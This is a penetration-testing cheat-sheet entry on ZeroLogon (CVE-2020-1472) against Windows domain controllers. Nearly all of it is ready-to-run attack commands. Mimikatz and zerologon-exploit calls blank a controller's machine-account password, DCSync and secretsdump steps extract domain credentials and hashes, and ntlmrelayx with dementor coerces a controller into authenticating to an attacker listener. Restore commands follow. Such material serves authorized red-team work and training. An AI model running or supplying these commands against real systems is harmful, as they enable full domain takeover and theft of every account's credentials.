---
technique: ZeroLogon
category: netlogon
targets: Domain Controllers
protocols: MS-NRPC, Netlogon
remote_capable: true
tags: netlogon zerologon cve-2020-1472 ms-nrpc dc privilege-escalation dcsync
---

# ZeroLogon (CVE-2020-1472)

ZeroLogon exploits a cryptographic flaw in MS-NRPC (Netlogon Remote Protocol): AES-CFB8 is used with a static all-zero IV, meaning roughly 1 in 256 authentication attempts with an all-zero plaintext will succeed. An unauthenticated attacker can spoof any machine account, including a DC's, and reset its password to empty, enabling DCSync and full domain compromise.

## Windows

Mimikatz provides scan, exploit, DCSync, and password-restoration commands for the full ZeroLogon chain.

### Step 1: Scan for ZeroLogon (Mimikatz)

#powershell #mimikatz #recon

Scan a DC to confirm it is vulnerable to ZeroLogon via Mimikatz.

```powershell title:"Scan DC for ZeroLogon vulnerability with Mimikatz"
lsadump::zerologon /target:"$dc_fqdn" /account:"$dc_account$"
```
<!-- cheat
import domain_ip
var dc_fqdn
var dc_account
-->

### Step 2: Exploit ZeroLogon (Mimikatz)

#powershell #mimikatz #exploit #disruptive

Reset the DC machine account password to empty via the ZeroLogon exploit in Mimikatz.

```powershell title:"Exploit ZeroLogon to blank DC machine account password with Mimikatz"
lsadump::zerologon /exploit /target:"$dc_fqdn" /account:"$dc_account$"
```
<!-- cheat
import domain_ip
var dc_fqdn
var dc_account
-->

### Step 3: DCSync as DC account (Mimikatz)

#powershell #mimikatz #dcsync

Perform DCSync using the now-empty DC machine account password to extract domain credentials.

```powershell title:"DCSync domain credentials using blank DC machine account via Mimikatz"
lsadump::dcsync /domain:"$domain" /dc:"$dc_fqdn" /user:Administrator /authuser:"$dc_account$" /authdomain:"$domain" /authpassword:'' /authntlm
```
<!-- cheat
import domain_ip
var dc_fqdn
var dc_account
-->

### Step 4: Restore DC machine account password (Mimikatz)

#powershell #mimikatz #restore #disruptive

Restore the original DC machine account password after exploitation using Mimikatz postzerologon.

```powershell title:"Restore DC machine account password after ZeroLogon with Mimikatz"
lsadump::postzerologon /target:"$dc_fqdn" /account:"$dc_account$"
```
<!-- cheat
import domain_ip
var dc_fqdn
var dc_account
-->

## Linux

The preferred exploitation path relays a coerced DC authentication directly into a DCSync without modifying any passwords.

### ntlmrelayx (DCSync relay)

#python #relay #impacket

Set up ntlmrelayx to relay an incoming DC authentication directly into a DCSync against a second DC.

```sh title:"Relay DC authentication to DCSync via ntlmrelayx"
ntlmrelayx.py -t dcsync://"$dc2_ip" -smb2support
```
<!-- cheat
import domain_ip
var dc2_ip
-->

### dementor (coerce DC auth)

#python #coercion #password

Coerce the primary DC's machine account to authenticate to the relay listener using PrinterBug.

```sh title:"Coerce DC authentication for ZeroLogon relay with dementor"
dementor.py -d "$domain" -u "$user" -p "$pass" "$lhost" "$dc1_ip"
```
<!-- cheat
import domain_ip
import users
import passwords
import tun_ip
var dc1_ip
-->

### Step 1: Scan for ZeroLogon (zerologon-scan)

#python #recon #disruptive

Scan the target DC to confirm it is vulnerable to ZeroLogon before exploitation.

```sh title:"Scan DC for ZeroLogon vulnerability"
zerologon-scan "$dc_name" "$rhost_ip"
```
<!-- cheat
import domain_ip
var dc_name
var dc_ip
-->

### Step 2: Exploit ZeroLogon (zerologon-exploit)

#python #exploit #disruptive

Reset the DC machine account password to empty via the ZeroLogon exploit.

```sh title:"Exploit ZeroLogon to blank DC machine account password"
zerologon-exploit "$dc_name" "$rhost_ip"
```
<!-- cheat
import domain_ip
var dc_name
var dc_ip
-->

### Step 3: Dump hashes with empty DC password (secretsdump)

#python #dcsync #impacket #disruptive

Dump domain hashes using the now-empty DC machine account password via secretsdump.

```sh title:"Dump domain hashes using empty DC machine account password"
secretsdump -no-pass "$domain"/"$dc_name$"@"$rhost_ip"
```
<!-- cheat
import domain_ip
var dc_name
var dc_ip
-->

### Step 4: Restore DC machine account password (zerologon-restore)

#python #restore #impacket #disruptive

Restore the original DC machine account password using the hex-encoded original value.

```sh title:"Restore DC machine account password after ZeroLogon"
zerologon-restore "$domain"/"$dc_name"@"$rhost_ip" -target-ip "$rhost_ip" -hexpass "$dc_hexpass"
```
<!-- cheat
import domain_ip
var dc_name
var dc_ip
var dc_hexpass
-->
